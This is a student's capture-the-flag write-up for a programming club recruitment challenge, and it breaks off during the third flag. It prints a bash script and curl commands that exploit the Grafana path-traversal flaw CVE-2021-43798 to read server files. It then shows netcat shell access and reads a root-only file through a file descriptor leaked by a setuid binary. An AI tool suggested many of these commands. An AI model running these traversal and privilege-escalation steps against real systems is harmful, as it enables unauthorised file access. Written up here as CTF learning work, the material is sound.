# PClub_Secretary_Recruitment_Operation_Shadow_Trace


Name: Vinayak Chandra Srivastava
Roll No: 241166

Flags Found:

Blog 1:
PClub{idk_how_this_got_typed}
Blog 2:
PClub{Easy LFI}

PClub{4lw4ys_cl05e_y0ur_fil3s}

Order of FInding Flags:

PClub{Easy LFI}

PClub{4lw4ys_cl05e_y0ur_fil3s}

PClub{idk_how_this_got_typed}




Note for Github: I had documented my journey of finding flags on a Google Document(https://docs.google.com/document/d/108lmb-T1Cc5iEsIdvVQ815flneKoY7CVXKnBNbgC2A4/), which would be more readable than this readme file I guess. However, as per the deliverables, I have pasted the contents of the document here.




From Blog 2:

# FLAG 1
 
The blog contains a Grafana environment hosted on 13.126.50.182:3000

According to the hint, I first searched for the vulnerability of Grafana.
I found that it might be CVE-2021-43798 which is a directory traversal vulnerability in Grafana versions prior to 8.3.1. 
The version used here is 8.3.0 deliberately.

The second hint gave away that the user is using a temporary location to store the file, making it clear that we need to find the flag using paths only, not through logging into the Grafana environment.

On some searching, I found that I can run a bash script using different plugins in order to see if there is any text like “PClub{” using grep(used for finding patterns). I am not familiar with bash coding, so I prompted Perplexity to write me a bash script. It gave me the following:



#!/bin/bash

BASE_URL="http://13.126.50.182:3000/public/plugins"
PLUGINS=(
  alertlist graph text welcome barchart logs table annolist heatmap geomap
  nodeGraph stat state-timeline timeseries xychart
)

PATHS=(
  /tmp/flag /tmp/flag.txt /tmp/key /tmp/key.txt /tmp/PClub_flag
  /var/tmp/flag /var/tmp/flag.txt /run/flag /run/flag.txt /usr/tmp/flag
  /dev/shm/flag /tmp/pclub_flag.txt /tmp/sneaky_flag /tmp/.hidden_flag
  /tmp/.flag /tmp/.pclub /tmp/.secret
)

TRAVERSAL="../../../../../../../../"

echo "[*] Starting Grafana Flag Finder..."

for plugin in "${PLUGINS[@]}"; do
  for path in "${PATHS[@]}"; do
    URL="$BASE_URL/$plugin/$TRAVERSAL$path"
    echo "[*] Trying: $URL"
    RESPONSE=$(curl -s "$URL")
    if echo "$RESPONSE" | grep -q "PClub{"; then
      echo
      echo "[+] Flag found!"
      echo "$RESPONSE"
      exit 0
    fi
  done
done

echo
echo "[-] No flag found with current plugins and paths."



It also gave me the logic that there should be 8 such /../ because 
“Typically, 8 levels (../../../../../../../../) is enough to reach root / from where the plugin files reside”

However, the bash script gave me no flag and hence was of no use.



I found on Googling that the curl command can be useful for my task as it directly opens the path I type after curl.

I asked Perplexity to write the command for me. It gave:
curl http://13.126.50.182:3000/public/plugins/alertlist/../../../../../../../../../../../../tmp/flag
Which on writing on terminal gives:
<a href="/login">Found</a>.
Which means opening the page directly requires a login and I need to bypass it. On prompting this, Perplexity gave me the command for it which is path-as-is
curl --path-as-is http://13.126.50.182:3000/public/plugins/alertlist/../../../../../../../../../../../../tmp/flag

Typing this on the terminal gave me the following message, which also includes the flag.

PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729


# FLAG 2

Now I tried opening both these links but they didn’t open in the browser. Hence I ran curl commands to open them on terminal..
I got:
curl: (1) Received HTTP/0.9 when not allowed
Hence I searched for more LInux commands I can use here on Perplexity. I found this and used it:
nc -v 13.235.21.137 4657

Now I got connected to the port:
Connection to 13.235.21.137 4657 port [tcp/*] succeeded!
sh: 0: can't access tty; job control turned off

I now typed ls to list the files present and got two files:
file_chal and file_chal.c

On typing cat file_chal to get its contents, I got this:

ELF>�@�5@8@@@���HH		   ���-�=�=hp�-�=�=�PPP@���$$� � �   S�tdPPP@P�td   $$Q�tdR�td�-�=�=000GNU����GNU.S#�E�a�ȉ$(�,F/lib64/ld-linux-x86-64.so.2%x F�  � 7"__stack_chk_failsetuidexecvpopen__libc_start_main__cxa_finalizegetuidlibc.so.6GLIBC_2.2.5GLIBC_2.4GLIBC_2.34_ITM_deregisterTMCloneTable__gmon_start___ITM_rc���m�p� 00@�?�?�?��?�i	Wii
@@@ @	��H�H��/H��t��H���5�/�%�/@�%�/h������%�/h������%�/h������%�/h�����%�/h������1�I��^H��H���PTE1�1�H�=��f.�H�=�/H�z/H9�tH��.H��t	�����H�=Q/H�5J/H)�H��H��H�=�.��.�c�����.]�f.��ff.�@���g���UH��H��0dH�%(H�E�1��H�hH�Ǹ�����E�����������H�PH�E�H�E�H�E�H��H�9H�������H�U�dH+%(t�6�������H�H��/root/flagsh/bin/sh ���Td���<]���|zRx
       ���&D$4����`FJ
~                    �?�;*3$"\�����A�C
GNUp M
�������o���
�
 �?x�	������o����o���o����o�=6FVfv0@GCC: (GNU) 14.2.1 20250207����= $�?:W � (@ 8@, FY"t@� �0@� �@@�
         file.c_DYNAMIC__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_start_main@GLIBC_2.34_ITM_deregisterTMCloneTable_edata_fini__stack_chk_fail@GLIBC_2.4getuid@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used_end__bss_startmainopen@GLIBC_2.2.5execvp@GLIBC_2.2.5__TMC_END___ITM_registerTMCloneTablesetuid@GLIBC_2.2.5__cxa_finalize@GLIBC_2.2.5_init.symtab.strtab.shstrtab.note.gnu.property.note.gnu.build-id.interp.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.text.fini.rodata.eh_frame_hdr.eh_frame.note.ABI-tag.init_array.fini_array.dynamic.got.got.plt.data.bss.comment[���c���o��p���o���B���  `���080��  $�2zr4$  �  ������=�-��?���?�(8@80



Which contains a lot of non-readable text.

I then typed cat file_chal.c to get its contents.
I got the following C code:

#include <fcntl.h>
#include <unistd.h>

int main () {
    int fd = open ("/root/flag", 0);

    // Dropping root previliges
    // definitely not forgetting anything
    setuid (getuid ());

    char* args[] = { "sh", 0 };
    execvp ("/bin/sh", args);
    return 0;
}

Then I searched on Perplexity how I should proceed and what commands are possible to use here. Using this, I found the flag as follows:



$ ls -l file_chal
-rwsr-xr-x 1 root root 15624 May 13 21:05 file_chal

“If the output shows -rwsr-xr-x (with the s in permissions), the binary has the setuid bit set, meaning it runs with root privileges temporarily.
The -rwsr-xr-x permissions confirm that file_chal has the setuid bit set, allowing it to temporarily run with root privileges. Here's how to exploit this to read the flag:
Execute the binary (spawns a non-root shell but retains the open file descriptor):
./file_chal
Read the flag via the inherited file descriptor (fd=3):
cat /proc/self/fd/3”
I tried this but I got Permission Denied:

$ ./file_chal
cat /proc/self/fd/3
sh: 0: can't access tty; job control turned off
$ cat: /proc/self/fd/3: Permission denied

On prompting this I got this response, which worked:

“The error occurs because accessing /proc/self/fd/3 after dropping privileges triggers a permission re-check on the underlying file (/root/flag), which your non-root shell can’t bypass. However, the file descriptor (fd=3) itself retains access to the file opened earlier as root. Here's how to read the flag:
Use direct file descriptor access instead of /proc paths:
bash
./file_chal  #Run the binary to spawn a shell
cat <&3      #Read from the inherited file descriptor”

$ ./file_chal  #Run the binary to spawn a shell
cat <&3      #Read from the inherited file descriptor
sh: 0: can't access tty; job control turned off
$ PClub{4lw4ys_cl05e_y0ur_fil3s}

# FLAG 3

Now I did the same to open the second link on terminal:

nc -v 13.235.21.137 4729
Connection to 13.235.21.137 4729 port [tcp/*] succeeded!
/bin/sh: 0: can't access tty; job control turned off

This time, however, on typing ls, I got nothing, which means that either there is no file, or the file is hidden.

Hence I typed
ls -a 
this time, so that it displays any hidden files and I got 4 files!

$ nc -v 13.235.21.137 4729
Connection to 13.235.21.137 4729 port [tcp/*] succeeded!
/bin/sh: 0: can't access tty; job control turned off
$ ls -a
.  ..  .swo  .swp

Now I tried opening these:

$ nc -v 13.235.21.137 4729
Connection to 13.235.21.137 4729 port [tcp/*] succeeded!
/bin/sh: 0: can't access tty; job control turned off
$ ls -a
.  ..  .swo  .swp
$ cat <.
cat: -: Is a directory
$ cat <..
cat: -: Is a directory
$ cat <.swo
/bin/sh: 6: cannot open .swo: Permission denied
$ cat <.swp
/bin/sh: 7: cannot open .swp: Permission denied

So 2 of them are directories and 2 of them files(for which I have permission denied).
I tried changing directories but it did not allow me to:

$ cd <.
/bin/sh: 2: cd: can't cd to /home/ctf
$ cd <..
/bin/sh: 3: cd: can't cd to /home/ctf


I prompted this to Perplexity and it told me that the 2 files are “Vim swap” and must have the flag I wish to find:
Vim swap files (.swp, .swo) store unsaved changes or file contents, even if the original file is deleted.
The error Permission denied occurs because the swap file is owned by another user (e.g., root), but transferring it bypasses local permissions.
“

So I followed the commands which it told me to write. I first created a file.txt in tmp directory 
In order to read the denied swp file on my local machine. However, this did not help so I resorted to using other methods:



$ ls -la
total 32
drwxr-xr-x 1 root root  4096 May 21 22:22 .
drwxr-xr-x 1 root root  4096 May 15 11:41 ..
-rw------- 1 root root 12288 May 21 22:22 .swo
-rw------- 1 root root 12288 May 21 22:20 .swp
$ ls -l ..
total 72
lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 22  2024 boot
drwxr-xr-x   1 root root 4096 May 21 22:22 chal
drwxr-xr-x   5 root root  340 May 15 11:41 dev
drwxr-xr-x   1 root root 4096 May 22 02:44 etc
drwxr-xr-x   1 root root 4096 Apr 15 14:11 home
lrwxrwxrwx   1 root root    7 Apr 22  2024 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Apr 22  2024 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Apr 15 14:04 media
drwxr-xr-x   2 root root 4096 Apr 15 14:04 mnt
drwxr-xr-x   2 root root 4096 Apr 15 14:04 opt
dr-xr-xr-x 322 root root    0 May 15 11:41 proc
drwx------   1 root root 4096 May 22 17:13 root
drwxr-xr-x   1 root root 4096 May 21 11:45 run
lrwxrwxrwx   1 root root    8 Apr 22  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Apr 15 14:04 srv
dr-xr-xr-x  13 root root    0 May 21 11:02 sys
drwxrwxrwt   1 root root 4096 May 22 14:10 tmp
drwxr-xr-x   1 root root 4096 Apr 15 14:04 usr
drwxr-xr-x   1 root root 4096 Apr 15 14:11 var
$ cd /chal      
$ ls -ls
total 0
$ cd.. 
/bin/sh: 6: cd..: not found
$ cd -
/chal
$ grep -r PClub{
grep: .swo: Permission denied
grep: .swp: Permission denied


Some more attempts:
$ ls -a
.  ..  .swo  .swp
$ cd ..
$ ls
bin   chal  etc   lib	 media	opt   root  sbin  sys  usr
boot  dev   home  lib64  mnt	proc  run   srv   tmp  var
$ cd /root
/bin/sh: 4: cd: can't cd to /root
$ ls /root
ls: cannot open directory '/root': Permission denied
$ ls /bin
'['			   iconv	      sensible-editor
 addpart		   id		      sensible-pager
 apt			   infocmp	      sensible-terminal
 apt-cache		   infotocap	      seq
 apt-cdrom		   install	      setarch
 apt-config		   ionice	      setpriv
 apt-get		   ipcmk	      setsid
 apt-key		   ipcrm	      setterm
 apt-mark		   ipcs		      sg
 arch			   ischroot	      sh
 awk			   join		      sha1sum
 b2sum			   kill		      sha224sum
 base32			   last		      sha256sum
 base64			   lastb	      sha384sum
 basename		   lastlog	      sha512sum
 basenc			   ld.so	      shred
 bash			   ldd		      shuf
 bashbug		   link		      skill
 captoinfo		   linux32	      slabtop
 cat			   linux64	      sleep
 chage			   ln		      snice
 chattr			   locale	      socat
 chcon			   locale-check       socat-broker.sh
 chfn			   localedef	      socat-chain.sh
 chgrp			   logger	      socat-mux.sh
 chmod			   login	      socat1
 choom			   logname	      sort
 chown			   ls		      split
 chrt			   lsattr	      stat
 chsh			   lsblk	      stdbuf
 cksum			   lscpu	      stty
 clear			   lsipc	      su
 clear_console		   lslocks	      sudo
 cmp			   lslogins	      sudoedit
 comm			   lsmem	      sudoreplay
 cp			   lsns		      sum
 csplit			   man		      sync
 cut			   mawk		      tabs
 cvtsudoers		   mcookie	      tac
 dash			   md5sum	      tail
 date			   md5sum.textutils   tar
 dd			   mesg		      taskset
 deb-systemd-helper	   mkdir	      tee
 deb-systemd-invoke	   mkfifo	      tempfile
 debconf		   mknod	      test
 debconf-apt-progress	   mktemp	      tic
 debconf-communicate	   more		      timeout
 debconf-copydb		   mount	      tload
 debconf-escape		   mountpoint	      toe
 debconf-set-selections    mv		      top
 debconf-show		   namei	      touch
 delpart		   nawk		      tput
 df			   newgrp	      tr
 diff			   nice		      true
 diff3			   nisdomainname      truncate
 dir			   nl		      tset
 dircolors		   nohup	      tsort
 dirname		   nproc	      tty
 dmesg			   nsenter	      tzselect
 dnsdomainname		   numfmt	      uclampset
 domainname		   od		      umount
 dpkg			   pager	      uname
 dpkg-deb		   partx	      uncompress
 dpkg-divert		   passwd	      unexpand
 dpkg-maintscript-helper   paste	      uniq
 dpkg-query		   pathchk	      unlink
 dpkg-realpath		   perl		      unminimize
 dpkg-split		   perl5.38.2	      unshare
 dpkg-statoverride	   pgrep	      update-alternatives
 dpkg-trigger		   pidof	      uptime
 du			   pidwait	      users
 echo			   pinky	      utmpdump
 editor			   pkill	      vdir
 egrep			   pldd		      vi
 env			   pmap		      view
 ex			   pr		      vim
 expand			   printenv	      vim.basic
 expiry			   printf	      vimdiff
 expr			   prlimit	      vimtutor
 factor			   procan	      vmstat
 faillog		   ps		      w
 fallocate		   ptx		      wall
 false			   pwd		      watch
 fgrep			   pwdx		      wc
 filan			   rbash	      wdctl
 find			   readlink	      whereis
 findmnt		   realpath	      which
 flock			   rename.ul	      which.debianutils
 fmt			   renice	      who
 fold			   reset	      whoami
 free			   resizepart	      x86_64
 getconf		   rev		      xargs
 getent			   rgrep	      xxd
 getopt			   rm		      yes
 gpasswd		   rmdir	      ypdomainname
 gpgv			   run-parts	      zcat
 grep			   runcon	      zcmp
 groups			   rview	      zdiff
 gunzip			   rvim		      zdump
 gzexe			   savelog	      zegrep
 gzip			   script	      zfgrep
 hardlink		   scriptlive	      zforce
 head			   scriptreplay       zgrep
 helpztags		   sdiff	      zless
 hostid			   sed		      zmore
 hostname		   select-editor      znew
 i386			   sensible-browser


I tried using base64 .swp but still got permission denied.

I saw in the files in /bin a file named gpasswd, so I opened it. I got a chunk of readable and non-readable characters.

Same happened with file passwd. I am not pasting them because they occupy a lot of space.


Next I tried:
$ vi .swp

^[[2;2R^[[3;1R/PClub{
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
~                                                                               
E486: Pattern not found: PClub{                               0,0-1         All

Which also failed

I also tried:
awk '/PClub{/' .swp
But of no use

Next try:
$ vim -r .swp











E306: Cannot open .swp
Press ENTER or type command to continue


Now Perplexity told me the following:
Check Parent Process File Descriptors
The .swp file is owned by root, but the service you connected to might have opened it. Access it via the parent process’s file descriptors:

PPID=$(ps -o ppid= -p $$)  #Get parent PID
ls -l /proc/$PPID/fd       #List open descriptors
Hence I tried it and got:

$ PPID=$(ps -o ppid= -p $$)  #Get parent PID
ls -l /proc/$PPID/fd       #List open descriptors
$ ls: cannot access '3495/fd': No such file or directory
/proc/:
total 0
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 1
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 16
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 1679
dr-xr-xr-x  9 ctf  ctf     0 May 22 10:33 1684
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 17
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 1842
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 1843
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2098
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2099
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2158
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2159
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2161
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2163
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 232
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2320
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2321
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 233
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2453
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2454
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2510
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2511
dr-xr-xr-x  9 root root    0 May 23 04:58 2521
dr-xr-xr-x  9 root root    0 May 23 04:58 2522
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2529
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2530
dr-xr-xr-x  9 root root    0 May 23 04:58 2534
dr-xr-xr-x  9 root root    0 May 23 04:58 2535
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2549
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 255
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2550
dr-xr-xr-x  9 ctf  ctf     0 May 22 06:48 256
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2647
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2648
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2655
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2656
dr-xr-xr-x  9 root root    0 May 23 04:58 2674
dr-xr-xr-x  9 root root    0 May 23 04:58 2675
dr-xr-xr-x  9 root root    0 May 23 04:58 2676
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2726
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2727
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2732
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2850
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2851
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2901
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2902
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2907
dr-xr-xr-x  9 ctf  ctf     0 May 22 11:48 2915
dr-xr-xr-x  9 ctf  ctf     0 May 22 11:49 2916
dr-xr-xr-x  9 root root    0 May 22 11:50 2927
dr-xr-xr-x  9 root root    0 May 22 11:50 2928
dr-xr-xr-x  9 root root    0 May 22 11:50 2929
dr-xr-xr-x  9 root root    0 May 22 11:50 2930
dr-xr-xr-x  9 root root    0 May 22 11:51 2932
dr-xr-xr-x  9 ctf  ctf     0 May 22 13:30 3146
dr-xr-xr-x  9 ctf  ctf     0 May 22 13:30 3147
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 317
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 318
dr-xr-xr-x  9 ctf  ctf     0 May 22 14:39 3247
dr-xr-xr-x  9 ctf  ctf     0 May 22 14:39 3248
dr-xr-xr-x  9 ctf  ctf     0 May 22 14:39 3263
dr-xr-xr-x  9 ctf  ctf     0 May 22 14:39 3264
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 331
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 332
dr-xr-xr-x  9 ctf  ctf     0 May 22 19:45 3389
dr-xr-xr-x  9 ctf  ctf     0 May 22 19:45 3390
dr-xr-xr-x  9 root root    0 May 22 17:14 3392
dr-xr-xr-x  9 root root    0 May 23 04:58 3393
dr-xr-xr-x  9 root root    0 May 23 04:58 3394
dr-xr-xr-x  9 ctf  ctf     0 May 22 19:45 3405
dr-xr-xr-x  9 ctf  ctf     0 May 22 19:45 3406
dr-xr-xr-x  9 ctf  ctf     0 May 22 19:45 3411
dr-xr-xr-x  9 ctf  ctf     0 May 22 19:45 3412
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 3415
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 3416
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:17 3464
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:17 3465
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:06 3468
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:17 3484
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:17 3485
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:30 3495
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:30 3496
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 350
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:30 3500
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 518
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 519
dr-xr-xr-x  9 ctf  ctf     0 May 22 10:33 528
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:55 556
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 557
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 717
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 718
drwxrwxrwt  2 root root   40 May 15 11:41 acpi
-r--r--r--  1 root root    0 May 23 05:30 bootconfig
-r--r--r--  1 root root    0 May 23 05:30 buddyinfo
dr-xr-xr-x  4 root root    0 May 15 11:41 bus
-r--r--r--  1 root root    0 May 23 05:30 cgroups
-r--r--r--  1 root root  157 May 23 05:30 cmdline
-r--r--r--  1 root root    0 May 23 05:30 consoles
-r--r--r--  1 root root    0 May 23 05:30 cpuinfo
-r--r--r--  1 root root    0 May 23 05:30 crypto
-r--r--r--  1 root root    0 May 23 05:30 devices
-r--r--r--  1 root root    0 May 23 05:30 diskstats
-r--r--r--  1 root root    0 May 23 05:30 dma
dr-xr-xr-x  3 root root    0 May 23 05:30 driver
dr-xr-xr-x  3 root root    0 May 23 05:30 dynamic_debug
-r--r--r--  1 root root    0 May 23 05:30 execdomains
-r--r--r--  1 root root    0 May 23 05:30 fb
-r--r--r--  1 root root    0 May 23 04:51 filesystems
dr-xr-xr-x  5 root root    0 May 15 11:41 fs
crw-rw-rw-  1 root root 1, 3 May 15 11:41 interrupts
-r--r--r--  1 root root    0 May 23 05:30 iomem
-r--r--r--  1 root root    0 May 23 05:30 ioports
dr-xr-xr-x 28 root root    0 May 15 11:41 irq
-r--r--r--  1 root root    0 May 23 05:30 kallsyms
crw-rw-rw-  1 root root 1, 3 May 15 11:41 kcore
-r--r--r--  1 root root    0 May 23 05:30 key-users
crw-rw-rw-  1 root root 1, 3 May 15 11:41 keys
-r--------  1 root root    0 May 23 05:30 kmsg
-r--------  1 root root    0 May 23 05:30 kpagecgroup
-r--------  1 root root    0 May 23 05:30 kpagecount
-r--------  1 root root    0 May 23 05:30 kpageflags
crw-rw-rw-  1 root root 1, 3 May 15 11:41 latency_stats
-r--r--r--  1 root root    0 May 23 05:30 loadavg
-r--r--r--  1 root root    0 May 23 05:30 locks
-r--r--r--  1 root root    0 May 23 05:30 mdstat
-r--r--r--  1 root root    0 May 23 05:30 meminfo
-r--r--r--  1 root root    0 May 23 05:30 misc
-r--r--r--  1 root root    0 May 23 05:30 modules
lrwxrwxrwx  1 root root   11 May 23 05:30 mounts -> self/mounts
-rw-r--r--  1 root root    0 May 23 05:30 mtrr
lrwxrwxrwx  1 root root    8 May 23 05:30 net -> self/net
-r--------  1 root root    0 May 23 05:30 pagetypeinfo
-r--r--r--  1 root root    0 May 23 05:30 partitions
dr-xr-xr-x  5 root root    0 May 23 05:30 pressure
-r--r--r--  1 root root    0 May 23 05:30 schedstat
drwxrwxrwt  2 root root   40 May 15 11:41 scsi
lrwxrwxrwx  1 root root    0 May 15 11:41 self -> 3500
-r--------  1 root root    0 May 23 05:30 slabinfo
-r--r--r--  1 root root    0 May 23 05:30 softirqs
-r--r--r--  1 root root    0 May 23 05:30 stat
-r--r--r--  1 root root    0 May 23 05:30 swaps
dr-xr-xr-x  1 root root    0 May 15 11:41 sys
--w-------  1 root root    0 May 15 11:41 sysrq-trigger
dr-xr-xr-x  5 root root    0 May 23 05:30 sysvipc
lrwxrwxrwx  1 root root    0 May 15 11:41 thread-self -> 3500/task/3500
crw-rw-rw-  1 root root 1, 3 May 15 11:41 timer_list
dr-xr-xr-x  6 root root    0 May 23 05:30 tty
-r--r--r--  1 root root    0 May 23 04:58 uptime
-r--r--r--  1 root root    0 May 23 05:30 version
-r--r--r--  1 root root    0 May 23 05:30 version_signature
-r--------  1 root root    0 May 23 05:30 vmallocinfo
-r--r--r--  1 root root    0 May 23 05:30 vmstat
dr-xr-xr-x  2 root root    0 May 23 05:30 xen
-r--r--r--  1 root root    0 May 23 05:30 zoneinfo

I also followed the following given by Perplexity:
$ PPID=$(ps -o ppid= -p $$)
$ ls -l /proc/$PPID/fd
...
3 -> /root/flag
...
$ cat /proc/$PPID/fd/3

But none gave me any progress.

I tried running this following:
$ ls /proc
1     2534  2929  3484	3810	       fs	      pressure
16    2535  2930  3485	518	       interrupts     schedstat
1679  2549  2932  3495	519	       iomem	      scsi
1684  255   3146  3496	528	       ioports	      self
17    2550  3147  350	556	       irq	      slabinfo
1842  256   317   3619	557	       kallsyms       softirqs
1843  2647  318   3620	717	       kcore	      stat
2098  2648  3263  3625	718	       key-users      swaps
2099  2655  3264  3626	acpi	       keys	      sys
2158  2656  331   3634	bootconfig     kmsg	      sysrq-trigger
2159  2674  332   3635	buddyinfo      kpagecgroup    sysvipc
2161  2675  3389  3636	bus	       kpagecount     thread-self
2163  2676  3390  3659	cgroups        kpageflags     timer_list
232   2726  3392  3660	cmdline        latency_stats  tty
2320  2727  3393  3662	consoles       loadavg	      uptime
2321  2732  3394  3663	cpuinfo        locks	      version
233   2850  3405  3664	crypto	       mdstat	      version_signature
2453  2851  3406  3759	devices        meminfo	      vmallocinfo
2454  2901  3411  3760	diskstats      misc	      vmstat
2510  2902  3412  3775	dma	       modules	      xen
2511  2907  3415  3776	driver	       mounts	      zoneinfo
2521  2915  3416  3777	dynamic_debug  mtrr
2522  2916  3464  3778	execdomains    net
2529  2927  3465  3808	fb	       pagetypeinfo
2530  2928  3468  3809	filesystems    partitions
$ cat /devices
cat: /devices: No such file or directory
$ cat proc/devices
cat: proc/devices: No such file or directory
$ cd /proc
$ ls
1     2534  2929  3484	3813	       fs	      pressure
16    2535  2930  3485	518	       interrupts     schedstat
1679  2549  2932  3495	519	       iomem	      scsi
1684  255   3146  3496	528	       ioports	      self
17    2550  3147  350	556	       irq	      slabinfo
1842  256   317   3619	557	       kallsyms       softirqs
1843  2647  318   3620	717	       kcore	      stat
2098  2648  3263  3625	718	       key-users      swaps
2099  2655  3264  3626	acpi	       keys	      sys
2158  2656  331   3634	bootconfig     kmsg	      sysrq-trigger
2159  2674  332   3635	buddyinfo      kpagecgroup    sysvipc
2161  2675  3389  3636	bus	       kpagecount     thread-self
2163  2676  3390  3659	cgroups        kpageflags     timer_list
232   2726  3392  3660	cmdline        latency_stats  tty
2320  2727  3393  3662	consoles       loadavg	      uptime
2321  2732  3394  3663	cpuinfo        locks	      version
233   2850  3405  3664	crypto	       mdstat	      version_signature
2453  2851  3406  3759	devices        meminfo	      vmallocinfo
2454  2901  3411  3760	diskstats      misc	      vmstat
2510  2902  3412  3775	dma	       modules	      xen
2511  2907  3415  3776	driver	       mounts	      zoneinfo
2521  2915  3416  3777	dynamic_debug  mtrr
2522  2916  3464  3778	execdomains    net
2529  2927  3465  3808	fb	       pagetypeinfo
2530  2928  3468  3809	filesystems    partitions
$ cat /devices
cat: /devices: No such file or directory
$ cat devices
Character devices:
  1 mem
  4 /dev/vc/0
  4 tty
  4 ttyS
  5 /dev/tty
  5 /dev/console
  5 /dev/ptmx
  5 ttyprintk
  7 vcs
 10 misc
 13 input
 21 sg
 29 fb
 89 i2c
108 ppp
128 ptm
136 pts
180 usb
189 usb_device
202 cpu/msr
203 cpu/cpuid
204 ttyMAX
226 drm
240 ttyDBC
241 nvme-generic
242 nvme
243 bsg
244 watchdog
245 remoteproc
246 ptp
247 pps
248 rtc
249 dma_heap
250 dax
251 dimmctl
252 ndctl
253 tpm
254 gpiochip
261 accel

Block devices:
  7 loop
  8 sd
  9 md
 11 sr
 65 sd
 66 sd
 67 sd
 68 sd
 69 sd
 70 sd
 71 sd
128 sd
129 sd
130 sd
131 sd
132 sd
133 sd
134 sd
135 sd
202 xvd
252 device-mapper
253 virtblk
254 mdp
259 blkext
$ cat self
cat: self: Is a directory
$ cd /self
/bin/sh: 9: cd: can't cd to /self
$ ls /self
ls: cannot access '/self': No such file or directory
$ ls /proc/self
arch_status	    fdinfo	       ns	      smaps_rollup
attr		    gid_map	       numa_maps      stack
autogroup	    io		       oom_adj	      stat
auxv		    ksm_merging_pages  oom_score      statm
cgroup		    ksm_stat	       oom_score_adj  status
clear_refs	    latency	       pagemap	      syscall
cmdline		    limits	       patch_state    task
comm		    loginuid	       personality    timens_offsets
coredump_filter     map_files	       projid_map     timers
cpu_resctrl_groups  maps	       root	      timerslack_ns
cpuset		    mem		       sched	      uid_map
cwd		    mountinfo	       schedstat      wchan
environ		    mounts	       sessionid
exe		    mountstats	       setgroups
fd		    net		       smaps

None of these files however seemed to be close to the flag.

I then tried this again:
grep -ar ‘PClub{‘

And got this:

$ grep -ar 'PClub{'
grep: .swo: Permission denied
grep: .swp: Permission denied

Which now ensures that the flag is in these 2 files only, however till now I haven’t been able to get through the “Permission denied” barrier.

I will restart since I might have missed some steps before concluding the .swp file can not be opened.

$ for fd in {3..20}; do
echo "Trying fd $fd:"
cat /proc/self/fd/$fd 2>/dev/null | grep -a 'PClub{' && break
done
> > > Trying fd {3..20}:
$ strings .swp | grep 'PClub{'
/bin/sh: 13: strings: not found
$ xxd -p .swp | grep '50436c75627b'
xxd: .swp: Permission denied

I will now retry the commands in /proc:

#List open file descriptors of the parent process
ls -l /proc/$PPID/fd

